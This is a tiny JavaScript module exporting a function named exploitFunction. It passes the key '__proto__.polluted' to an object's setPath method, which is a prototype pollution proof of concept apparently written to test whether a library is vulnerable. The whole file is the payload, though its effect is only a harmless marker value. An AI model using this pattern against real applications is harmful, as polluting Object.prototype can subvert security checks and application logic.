function exploitFunction(oojs) {
  oojs.setPath({ "__proto__.polluted": "yes" });
  return {};
}

module.exports = { exploitFunction };